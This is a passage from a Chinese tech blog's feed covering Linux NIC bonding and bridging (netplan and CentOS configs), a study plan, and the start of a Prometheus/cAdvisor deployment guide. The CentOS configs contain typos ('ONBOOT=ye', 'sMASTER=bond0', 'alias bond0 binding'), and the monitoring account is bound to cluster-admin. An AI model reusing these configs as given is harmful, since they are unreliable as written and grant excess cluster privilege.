class="string">[223.6.6.6,223.5.5.5]</span></span><br><span class="line"><span class="attr">parameters:</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">active-backup</span></span><br><span class="line"><span class="attr">mii-monitor-interval:</span> <span class="number">100</span></span><br><span class="line"><span class="comment"># sudo netplan apply</span></span><br></pre></td></tr></table></figure><h4 id="双网卡绑定-桥接"><a href="#双网卡绑定-桥接" class="headerlink" title="双网卡绑定+桥接"></a>双网卡绑定+桥接</h4><p>所谓桥接就是模拟出一个新的网卡把原本要配置在真实网卡上的ip地址拿到桥接网卡上，主要用于linux虚拟化。这里的效果就是将eht0和eth1 bond，然后将bond后的网卡当作新的网卡，并且将其绑定到bridge上。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo cat /etc/netplan/01-netcfg.yaml</span></span><br><span class="line"><span class="comment"># This file describes the network interfaces available on your system</span></span><br><span class="line"><span class="comment"># For more information, see netplan(5).</span></span><br><span class="line"><span class="attr">network:</span></span><br><span class="line"><span class="attr">version:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">renderer:</span> <span class="string">networkd</span></span><br><span class="line"><span class="attr">ethernets:</span></span><br><span class="line"><span class="attr">eth0:</span></span><br><span class="line"><span class="attr">dhcp4:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">dhcp6:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">eth1:</span></span><br><span class="line"><span class="attr">dhcp4:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">dhcp6:</span> <span class="literal">no</span></span><br><span class="line"></span><br><span class="line"><span class="attr">bonds:</span></span><br><span class="line"><span class="attr">bond0:</span></span><br><span class="line"><span class="attr">interfaces:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">eth0</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">eth1</span></span><br><span class="line"><span class="attr">parameters:</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">active-backup</span></span><br><span class="line"><span class="attr">mii-monitor-interval:</span> <span class="number">100</span></span><br><span class="line"><span class="attr">bridges:</span></span><br><span class="line"><span class="attr">br0:</span></span><br><span class="line"><span class="attr">dhcp4:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">dhcp6:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">addresses:</span> <span class="string">[172.18.3.18/16]</span></span><br><span class="line"><span class="attr">gateway4:</span> <span class="number">172.18</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">nameservers:</span></span><br><span class="line"><span class="attr">addresses:</span> <span class="string">[223.6.6.6,223.5.5.5]</span></span><br><span class="line"><span class="attr">interfaces:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">bond0</span></span><br><span class="line"><span class="comment">#reboot</span></span><br></pre></td></tr></table></figure><h4 id="多网卡绑定"><a href="#多网卡绑定" class="headerlink" title="多网卡绑定"></a>多网卡绑定</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">~#</span> <span class="string">sudo</span> <span class="string">cat</span> <span class="string">/etc/netplan/01-netcfg.yaml</span></span><br><span class="line"><span class="comment"># This file describes the network interfaces available on your system</span></span><br><span class="line"><span class="comment"># For more information, see netplan(5).</span></span><br><span class="line"><span class="attr">network:</span></span><br><span class="line"><span class="attr">version:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">renderer:</span> <span class="string">networkd</span></span><br><span class="line"><span class="attr">ethernets:</span></span><br><span class="line"><span class="attr">eth0:</span></span><br><span class="line"><span class="attr">dhcp4:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">dhcp6:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">eth1:</span></span><br><span class="line"><span class="attr">dhcp4:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">dhcp6:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">eth2:</span></span><br><span class="line"><span class="attr">dhcp4:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">dhcp6:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">eth3:</span></span><br><span class="line"><span class="attr">dhcp4:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">dhcp6:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">bonds:</span></span><br><span class="line"><span class="attr">bond0:</span></span><br><span class="line"><span class="attr">interfaces:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">eth0</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">eth1</span></span><br><span class="line"><span class="attr">addresses:</span> <span class="string">[172.18.3.18/16]</span></span><br><span class="line"><span class="attr">gateway4:</span> <span class="number">172.18</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">nameservers:</span></span><br><span class="line"><span class="attr">addresses:</span> <span class="string">[223.6.6.6,223.5.5.5]</span></span><br><span class="line"><span class="attr">parameters:</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">active-backup</span></span><br><span class="line"><span class="attr">mii-monitor-interval:</span> <span class="number">100</span></span><br><span class="line"><span class="attr">bond1:</span></span><br><span class="line"><span class="attr">interfaces:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">eth2</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">eth3</span></span><br><span class="line"><span class="attr">addresses:</span> <span class="string">[10.20.3.18/16]</span></span><br><span class="line"><span class="attr">parameters:</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">active-backup</span></span><br><span class="line"><span class="attr">mii-monitor-interval:</span> <span class="number">100</span></span><br><span class="line"><span class="attr">routes:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">to:</span> <span class="number">172.20</span><span class="number">.0</span><span class="number">.0</span><span class="string">/16</span></span><br><span class="line"><span class="attr">via:</span> <span class="number">10.20</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">to:</span> <span class="number">10.20</span><span class="number">.0</span><span class="number">.0</span><span class="string">/16</span></span><br><span class="line"><span class="attr">via:</span> <span class="number">10.20</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">to:</span> <span class="number">10.2</span><span class="number">.0</span><span class="number">.0</span><span class="string">/16</span></span><br><span class="line"><span class="attr">via:</span> <span class="number">10.20</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">to:</span> <span class="number">10.8</span><span class="number">.0</span><span class="number">.0</span><span class="string">/16</span></span><br><span class="line"><span class="attr">via:</span> <span class="number">10.20</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><h4 id="多网卡绑定-桥接"><a href="#多网卡绑定-桥接" class="headerlink" title="多网卡绑定+桥接"></a>多网卡绑定+桥接</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo cat /etc/netplan/01-netcfg.yaml</span></span><br><span class="line"><span class="comment"># This file describes the network interfaces available on your system</span></span><br><span class="line"><span class="comment"># For more information, see netplan(5).</span></span><br><span class="line"><span class="attr">network:</span></span><br><span class="line"><span class="attr">version:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">renderer:</span> <span class="string">networkd</span></span><br><span class="line"><span class="attr">ethernets:</span></span><br><span class="line"><span class="attr">eth0:</span></span><br><span class="line"><span class="attr">dhcp4:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">dhcp6:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">eth1:</span></span><br><span class="line"><span class="attr">dhcp4:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">dhcp6:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">eth2:</span></span><br><span class="line"><span class="attr">dhcp4:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">dhcp6:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">eth3:</span></span><br><span class="line"><span class="attr">dhcp4:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">dhcp6:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">bonds:</span></span><br><span class="line"><span class="attr">bond0:</span></span><br><span class="line"><span class="attr">interfaces:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">eth0</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">eth1</span></span><br><span class="line"><span class="attr">parameters:</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">active-backup</span></span><br><span class="line"><span class="attr">mii-monitor-interval:</span> <span class="number">100</span></span><br><span class="line"><span class="attr">bond1:</span></span><br><span class="line"><span class="attr">interfaces:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">eth2</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">eth3</span></span><br><span class="line"><span class="attr">parameters:</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">active-backup</span></span><br><span class="line"><span class="attr">mii-monitor-interval:</span> <span class="number">100</span></span><br><span class="line"><span class="attr">bridges:</span></span><br><span class="line"><span class="attr">br0:</span></span><br><span class="line"><span class="attr">dhcp4:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">dhcp6:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">addresses:</span> <span class="string">[172.18.3.18/16]</span></span><br><span class="line"><span class="attr">gateway4:</span> <span class="number">172.18</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">nameservers:</span></span><br><span class="line"><span class="attr">addresses:</span> <span class="string">[223.6.6.6,223.5.5.5]</span></span><br><span class="line"><span class="attr">interfaces:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">bond0</span></span><br><span class="line"><span class="attr">br1:</span></span><br><span class="line"><span class="attr">dhcp4:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">dhcp6:</span> <span class="literal">no</span></span><br><span class="line"><span class="attr">interfaces:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">bond1</span></span><br><span class="line"><span class="attr">addresses:</span> <span class="string">[10.20.3.18/16]</span></span><br><span class="line"><span class="attr">routes:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">to:</span> <span class="number">172.20</span><span class="number">.0</span><span class="number">.0</span><span class="string">/16</span></span><br><span class="line"><span class="attr">via:</span> <span class="number">10.20</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">to:</span> <span class="number">10.20</span><span class="number">.0</span><span class="number">.0</span><span class="string">/16</span></span><br><span class="line"><span class="attr">via:</span> <span class="number">10.20</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">to:</span> <span class="number">10.2</span><span class="number">.0</span><span class="number">.0</span><span class="string">/16</span></span><br><span class="line"><span class="attr">via:</span> <span class="number">10.20</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">to:</span> <span class="number">10.8</span><span class="number">.0</span><span class="number">.0</span><span class="string">/16</span></span><br><span class="line"><span class="attr">via:</span> <span class="number">10.20</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><h3 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a>Centos</h3><p>加bonding内核模板</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">modprobe --first-time bonding</span><br><span class="line">lsmod | grep bonding 或者 modinfo bonding</span><br></pre></td></tr></table></figure><p>关闭 NetworkManager 服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop NetworkManager.service</span><br><span class="line">systemctl disable NetworkManager.service</span><br></pre></td></tr></table></figure><p>配置网卡1</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-eno24</span><br><span class="line">TYPE=Ethernet</span><br><span class="line">BOOTPROTO=none</span><br><span class="line">USERCTL=no</span><br><span class="line">DEVICE=eno24</span><br><span class="line">ONBOOT=yes</span><br><span class="line">MASTER=bond0</span><br><span class="line">SLAVE=yes</span><br></pre></td></tr></table></figure><p> 配置网卡2</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-eno25</span><br><span class="line">TYPE=Ethernet</span><br><span class="line">BOOTPROTO=none</span><br><span class="line">USERCTL=no</span><br><span class="line">DEVICE=eno25</span><br><span class="line">ONBOOT=ye</span><br><span class="line">sMASTER=bond0</span><br><span class="line">SLAVE=yes</span><br></pre></td></tr></table></figure><p>配置bond</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-bond0</span><br><span class="line">TYPE=Bond</span><br><span class="line">BOOTPROTO=none</span><br><span class="line">ONBOOT=yes</span><br><span class="line">USERCTL=no</span><br><span class="line">DEVICE=bond0</span><br><span class="line">IPADDR=192.168.1.4</span><br><span class="line">PREFIX=24</span><br><span class="line">GATEWAY=192.168.1.254</span><br><span class="line">NM_CONTROLLED=no</span><br><span class="line">BONDING_MASTER=yes</span><br></pre></td></tr></table></figure><p>配置bonding驱动（不一定需要该操作）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/modprobe.d/bond.conf</span><br><span class="line">alias bond0 binding</span><br><span class="line">options bond0 miimon=100 mode=1</span><br></pre></td></tr></table></figure><p>重启网络服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service network restart</span><br></pre></td></tr></table></figure><p>查看bond0生效</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/net/bonding/bond0</span><br></pre></td></tr></table></figure><p>centos 7默认启动时没有加载bonding模块</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看bonding模块详细信息</span></span><br><span class="line">modinfo bonding</span><br><span class="line">filename  /lib/modules/3.10.0-229.el7.x86_64/kernel/drivers/net/bonding/bonding.ko</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置系统启动时加载bonding模块</span></span><br><span class="line">vim /etc/sysconfig/modules/bonding.modules </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">/sbin/modinfo -F filename bonding &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">if [ $? -eq 0 ];then</span><br><span class="line">    /sbin/modprobe bonding</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置执行权限</span></span><br><span class="line">chmod 755 /etc/sysconfig/modules/bonding.modules </span><br><span class="line"><span class="meta">#</span><span class="bash"> 重启查看是否生效</span></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> down掉一块网卡测试bondip是否正常</span></span><br><span class="line">ifdown ifcfg-eno25</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h3&gt;&lt;p&gt;生产环境中一台主机会有多个网卡，有时候我们会将两个网卡进行绑定，这样当一块网卡出现故障无法工作时另一个网卡还可以正常工作，可以理解为冗余，此外bond后由于多个网卡绑定到某个IP，能够大幅度提高网络总带宽和容错能力。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>后期学习计划安排</title>
    <link href="http://yoursite.com/2020/09/27/%E5%90%8E%E6%9C%9F%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92%E5%AE%89%E6%8E%92/"/>
    <id>http://yoursite.com/2020/09/27/%E5%90%8E%E6%9C%9F%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92%E5%AE%89%E6%8E%92/</id>
    <published>2020-09-26T16:45:25.000Z</published>
    <updated>2020-09-26T16:50:49.313Z</updated>
    
    <content type="html"><![CDATA[<p>由于目前正式进入工作状态，且马上到3个月转正，因此耽搁许久的博客需要维护起来，后续的学习计划也需要安排一下。</p><a id="more"></a><p>目前打算每天下班2小时左右按照马哥的架构课程跟着学习，考虑到每天学习时间较短以及工作中涉及的问题，我是按照工作需求进行学习，比如我工作中遇到过ELK、CEPH等问题，那么我现在每天学习ceph和elk相关的内容。后续其他课程会首先重点将所有中间件学习一遍，然后学习虚拟化技术（KVM、OPENSTACK），这里会结合杰哥的视频（openvpn相关内容）来学习（放在后面学习的原因是因为公司没有在使用）。</p><p>此外，由于课程还提供了老王的就业PDF，其中涉及的大部分我都学习过，但是并不是所有内容都会在工作中用到，因此会出现知识遗忘现象，所以为了巩固知识我目前是将pdf复制到手机在地铁或者午休时看一会，以此进行查漏补缺。</p><p>我工作日每天只有2小时左右的学习时间，考虑到马哥的每个视频都在80分钟左右（原理方面讲的比较详细），因此我目前的安排是当天晚上看视频学习（大概2个视频），第二天午休时进行操作。这样可以检验前一天的听课效果。对于周末来说，我一般安排周六上午以及周末一整天进行学习，并且我看视频会做简单的笔记，我在周末会将这周的笔记进行回顾，包括学习的操作方式也会进行复现并在操作中完善笔记，从而更新以前的博客内容。</p><p>对于每周的作业来说，如果不是我这周看的内容我也会尽量完成，因为都有PDF或者ppt，我会抽时间回顾一下顺便更新一下以前博客的总结。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;由于目前正式进入工作状态，且马上到3个月转正，因此耽搁许久的博客需要维护起来，后续的学习计划也需要安排一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="其他" scheme="http://yoursite.com/categories/%E5%85%B6%E4%BB%96/"/>
    
    
  </entry>
  
  <entry>
    <title>Prometheus-基础架构及部署</title>
    <link href="http://yoursite.com/2020/03/21/Prometheus-%E5%9F%BA%E7%A1%80%E6%9E%B6%E6%9E%84%E5%8F%8A%E9%83%A8%E7%BD%B2/"/>
    <id>http://yoursite.com/2020/03/21/Prometheus-%E5%9F%BA%E7%A1%80%E6%9E%B6%E6%9E%84%E5%8F%8A%E9%83%A8%E7%BD%B2/</id>
    <published>2020-03-21T10:00:09.000Z</published>
    <updated>2020-03-21T10:05:27.988Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这个系列文章将Prometheus部署在k8s集群中进行实验。</p><a id="more"></a><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li><p>多维度数据模型；</p><p>时间序列数据由metrics名称和键值对来组成</p><p>可以对数据进行聚合，切割等操作</p><p>所有的metrics都可以设置任意的多维标签。</p></li><li><p>灵活的查询语言（PromQL）：可以对采集的metrics指标进行加法，乘法，连接等操作；</p></li><li><p>可以直接在本地部署，不依赖其他分布式存储；</p></li><li><p>通过基于HTTP的pull方式采集时序数据；</p></li><li><p>可以通过中间网关push gateway的方式把时间序列数据推送到Prometheus server端；</p></li><li><p>可通过服务发现或者静态配置来发现目标服务对象（targets）。</p></li><li><p>有多种可视化图像界面，如Grafana等。</p></li><li><p>高效的存储，每个采样数据占3.5 bytes左右，300万的时间序列，30s间隔，保留60天，消耗磁盘大概200G。</p></li></ul><h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p><img src="/2020/03/21/Prometheus-%E5%9F%BA%E7%A1%80%E6%9E%B6%E6%9E%84%E5%8F%8A%E9%83%A8%E7%BD%B2/Prom%E6%9E%B6%E6%9E%84.png" alt="image-20200321160129232"></p><p><strong>Prometheus Server</strong>: 用于收集和存储时间序列数据。</p><p><strong>Retrieval</strong>:负责在活跃的target主机上抓取监控指标数据。</p><p><strong>Storage</strong>:存储主要是把采集到的数据存储到磁盘中。</p><p><strong>PromQL</strong>:是Prometheus提供的查询语言模块。</p><p><strong>Client Library</strong>: 客户端库，检测应用程序代码，当Prometheus抓取实例的HTTP端点时，客户端库会将所有跟踪的metrics指标的当前状态发送到prometheus server端。</p><p><strong>Exporters</strong>: prometheus支持多种exporter，通过exporter可以采集metrics数据，然后发送到prometheus server端</p><p><strong>Alertmanager</strong>: 从 Prometheus server 端接收到 alerts 后，会进行去重、分组并路由到相应的接收方，最后发出报警。常见的接收方式有：电子邮件，微信，钉钉，slack等。</p><p><strong>Grafana：</strong>监控仪表盘</p><p><strong>pushgateway</strong>: 各个目标主机可上报数据到pushgateway，然后prometheus server统一从pushgateway拉取数据。</p><h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><ol><li><p>Prometheus server可定期从活跃的（up）目标主机上（target）拉取监控指标数据，目标主机的监控数据可通过配置静态job或者服务发现的方式被prometheus server采集到，这种方式默认采用pull方式拉取指标；也可通过pushgateway把采集的数据上报到prometheus server中；还可通过一些组件自带的exporter采集相应组件的数据；</p></li><li><p>Prometheus server把采集到的监控指标数据保存到本地磁盘或者数据库；</p></li><li><p>Prometheus采集的监控指标数据按时间序列存储，通过配置报警规则，把触发的报警发送到alertmanager;</p></li><li><p>Alertmanager通过配置报警接收方，发送报警到邮件，微信或者钉钉等;</p></li><li><p>Prometheus 自带的web ui界面提供PromQL查询语言，可查询监控数据;</p></li><li><p>Grafana可接入prometheus数据源，把监控数据以图形化形式展示出.</p></li></ol><h3 id="cAdvisor"><a href="#cAdvisor" class="headerlink" title="cAdvisor"></a>cAdvisor</h3><p>用于收集容器的数据，k8s中一般集成在kubelet组件中。</p><h4 id="常见指标"><a href="#常见指标" class="headerlink" title="常见指标"></a>常见指标</h4><p>counter计数器：只是采集递增的指标<br>gauge标准尺寸：统计的指标可增加可减少</p><table><thead><tr><th>指标名称</th><th>类型</th><th>含义</th></tr></thead><tbody><tr><td>container_cpu_load_average_10s</td><td>gauge</td><td>过去10秒容器CPU的平均负载</td></tr><tr><td>container_cpu_usage_seconds_total</td><td>counter</td><td>容器在每个CPU内核上的累积占用时间 (单位：秒)</td></tr><tr><td>container_cpu_system_seconds_total</td><td>counter</td><td>System CPU累积占用时间(单位：秒)</td></tr><tr><td>container_cpu_user_seconds_total</td><td>counter</td><td>User CPU累积占用时间(单位：秒)</td></tr><tr><td>container_fs_usage_bytes</td><td>gauge</td><td>容器中文件系统的使用量(单位：字节)</td></tr><tr><td>container_fs_limit_bytes</td><td>gauge</td><td>容器可以使用的文件系统总量(单位：字节)</td></tr><tr><td>container_fs_reads_bytes_total</td><td>counter</td><td>容器累积读取数据的总量(单位：字节)</td></tr><tr><td>container_fs_writes_bytes_total</td><td>counter</td><td>容器累积写入数据的总量(单位：字节)</td></tr><tr><td>container_memory_max_usage_bytes</td><td>gauge</td><td>容器的最大内存使用量(单位：字节)</td></tr><tr><td>container_memory_usage_bytes</td><td>gauge</td><td>容器当前的内存使用量(单位：字节)</td></tr><tr><td>container_spec_memory_limit_bytes</td><td>gauge</td><td>容器的内存使用量限制</td></tr><tr><td>machine_memory_bytes</td><td>gauge</td><td>当前主机的内存总量</td></tr><tr><td>container_network_receive_bytes_total</td><td>counter</td><td>容器网络累积接收数据总量(单位：字节)</td></tr><tr><td>container_network_transmit_bytes_total</td><td>counter</td><td>容器网络累积传输数据总量(单位：字节)</td></tr></tbody></table><h4 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建名称空间monitor-sa</span></span><br><span class="line">kubectl create ns monitor-sa</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建sa</span></span><br><span class="line">kubectl create serviceaccount monitor -n monitor-sa</span><br><span class="line"></span><br><span class="line"><span class="comment">#绑定clusterrolebinding</span></span><br><span class="line">kubectl create clusterrolebinding monitor-clusterrolebinding -n monitor-sa --clusterrole=cluster-admin  --serviceaccount=monitor-sa:monitor</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取cAdvisor指标，token就是sa的secret中的token</span></span><br><span class="line">curl https://127.0.0.1:10250/metrics/cadvisor -k -H <span class="string">"Authorization: Bearer 